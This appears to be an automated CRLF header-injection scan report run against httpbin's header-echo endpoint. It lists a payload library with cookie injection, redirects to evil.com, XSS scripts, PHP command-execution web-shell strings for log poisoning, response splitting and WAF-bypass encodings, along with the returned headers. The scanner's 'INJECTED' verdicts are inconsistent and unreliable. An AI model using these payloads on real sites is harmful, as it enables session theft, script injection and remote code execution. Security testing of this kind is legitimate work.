@@ -1,0 +1,287 @@
+CRLF Scan Report
+Target: http://httpbin.org/response-headers?test=
+
+Payload: ###############################################
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '131', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '###############################################', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: #  CRLF Injection Payload Library – v2.0
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:58 GMT', 'Content-Type': 'text/html', 'Content-Length': '141', 'Connection': 'keep-alive'}
+
+Payload: #  Author: Gray (Subir) – CRLF Injector Project
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'text/html', 'Content-Length': '141', 'Connection': 'keep-alive'}
+
+Payload: ###############################################
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '131', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '###############################################', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 1. BASIC COOKIE INJECTION ##########
+Status: ERROR: 
+Headers: {}
+
+Payload: Set-Cookie: hacker=owned
+Status: INJECTED
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '108', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie: hacker=owned', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie: admin=true
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '106', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie: admin=true', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie: session=pwned
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '109', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie: session=pwned', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie: role=superuser
+Status: ERROR: 
+Headers: {}
+
+Payload: ########## 2. SECURITY HEADER OVERRIDES ##########
+Status: NO EFFECT
+Headers: {'Server': 'awselb/2.0', 'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'text/html', 'Content-Length': '122', 'Connection': 'keep-alive'}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: ERROR: 
+Headers: {}
+
+Payload: X-Content-Type-Options: insecure
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '116', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-Content-Type-Options: insecure', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-XSS-Protection: 0
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '103', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-XSS-Protection: 0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Referrer-Policy: unsafe-url
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '111', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Referrer-Policy: unsafe-url', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Strict-Transport-Security: max-age=0
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '120', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Strict-Transport-Security: max-age=0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Content-Security-Policy: unsafe-inline
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '122', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Content-Security-Policy: unsafe-inline', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Permissions-Policy: interest-cohort=*
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '121', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Permissions-Policy: interest-cohort=*', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 3. CORS MISCONFIG PAYLOADS ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '132', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 3. CORS MISCONFIG PAYLOADS ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Access-Control-Allow-Origin: *
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '114', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Access-Control-Allow-Origin: *', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Access-Control-Allow-Credentials: true
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '122', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Access-Control-Allow-Credentials: true', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Access-Control-Allow-Methods: GET,POST,OPTIONS
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '130', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Access-Control-Allow-Methods: GET,POST,OPTIONS', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Access-Control-Max-Age: 999999
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:58 GMT', 'Content-Type': 'application/json', 'Content-Length': '114', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Access-Control-Max-Age: 999999', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 4. REDIRECTION PAYLOADS ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '129', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 4. REDIRECTION PAYLOADS ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Location: https://evil.com
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '110', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Location: https://evil.com', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Location: http://attacker.test
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '114', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Location: http://attacker.test', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Location: javascript:alert('XSS')
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '117', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': "Location: javascript:alert('XSS')", 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Location: //evil.com
+Status: ERROR: 
+Headers: {}
+
+Payload: ########## 5. CACHE POISONING ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '124', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 5. CACHE POISONING ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Cache-Control: public,max-age=999999
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '120', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Cache-Control: public,max-age=999999', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-Cache: HIT
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '95', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-Cache: HIT', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Surrogate-Control: max-age=999999
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '117', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Surrogate-Control: max-age=999999', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Age: 0
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '89', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Age: 0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Expires: Wed, 21 Oct 2050 07:28:00 GMT
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '122', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Expires: Wed, 21 Oct 2050 07:28:00 GMT', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 6. HTML / BODY INJECTION ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '130', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 6. HTML / BODY INJECTION ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Content-Type: text/html
+Status: ERROR: 
+Headers: {}
+
+Payload: <h1>Injected by CRLF Exploit</h1>
+Status: ERROR: 
+Headers: {}
+
+Payload: <script>alert('Header Injection')</script>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '126', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': "<script>alert('Header Injection')</script>", 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 7. LOG POISONING (RCE CHAINS) ##########
+Status: ERROR: 
+Headers: {}
+
+Payload: User-Agent: <?php system($_GET['cmd']); ?>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '126', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': "User-Agent: <?php system($_GET['cmd']); ?>", 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: User-Agent: <?php echo shell_exec($_GET['cmd']); ?>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '135', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': "User-Agent: <?php echo shell_exec($_GET['cmd']); ?>", 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: User-Agent: <script>alert('XSS')</script>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '125', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': "User-Agent: <script>alert('XSS')</script>", 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: User-Agent: curl-pwned-by-Gray
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:58 GMT', 'Content-Type': 'application/json', 'Content-Length': '114', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'User-Agent: curl-pwned-by-Gray', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 8. RESPONSE SPLITTING ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '127', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 8. RESPONSE SPLITTING ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: HTTP/1.1 200 OK
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '98', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'HTTP/1.1 200 OK', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Content-Type: text/html
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:58 GMT', 'Content-Type': 'application/json', 'Content-Length': '107', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Content-Type: text/html', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: <h2>Split Response Successful</h2>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '118', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '<h2>Split Response Successful</h2>', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: HTTP/1.1 302 Found
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '102', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'HTTP/1.1 302 Found', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Location: https://evil.com
+Status: ERROR: 
+Headers: {}
+
+Payload: ########## 9. WAF/IDS BYPASS PAYLOADS ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '132', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 9. WAF/IDS BYPASS PAYLOADS ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie:%20bypass=1
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '106', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie:%20bypass=1', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie:+tabbed=ok
+Status: ERROR: 
+Headers: {}
+
+Payload: Set-Cookie:%09tab_char
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '106', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie:%09tab_char', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-Test:%0AInjected
+Status: ERROR: 
+Headers: {}
+
+Payload: Injected:%0D%0ASet-Cookie:WAF=Bypassed
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '122', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Injected:%0D%0ASet-Cookie:WAF=Bypassed', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 10. MULTI‑HEADER CHAINS ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'text/html', 'Content-Length': '141', 'Connection': 'keep-alive'}
+
+Payload: Set-Cookie: session=owned
+Status: ERROR: 
+Headers: {}
+
+Payload: Access-Control-Allow-Origin: *
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '114', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Access-Control-Allow-Origin: *', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Cache-Control: public,max-age=9999
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:54 GMT', 'Content-Type': 'application/json', 'Content-Length': '118', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Cache-Control: public,max-age=9999', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Set-Cookie: admin=true
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '106', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Set-Cookie: admin=true', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '109', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-Frame-Options: ALLOWALL', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-XSS-Protection: 0
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '103', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-XSS-Protection: 0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 11. ADVANCED CHAINED EXPLOITS ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '135', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 11. ADVANCED CHAINED EXPLOITS ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Content-Type: text/html
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '107', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Content-Type: text/html', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-Frame-Options: ALLOWALL
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:57 GMT', 'Content-Type': 'application/json', 'Content-Length': '109', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'X-Frame-Options: ALLOWALL', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: X-Content-Type-Options: insecure
+Status: ERROR: 
+Headers: {}
+
+Payload: <h1>Advanced Chain Executed</h1>
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:56 GMT', 'Content-Type': 'application/json', 'Content-Length': '116', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '<h1>Advanced Chain Executed</h1>', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: ########## 12. DEBUG / SERVERTOKEN CORRUPTION ##########
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '140', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': '########## 12. DEBUG / SERVERTOKEN CORRUPTION ##########', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Server: Apache
+Status: ERROR: 
+Headers: {}
+
+Payload: Server: Nginx
+Status: NO EFFECT
+Headers: {'Date': 'Fri, 21 Nov 2025 20:37:55 GMT', 'Content-Type': 'application/json', 'Content-Length': '96', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'test': 'Server: Nginx', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}
+
+Payload: Server: GrayInjector
+Status: ERROR: 
+Headers: {}
+
+Payload: X-Powered-By: PHP/999.0
+Status: ERROR: 
+Headers: {}
+
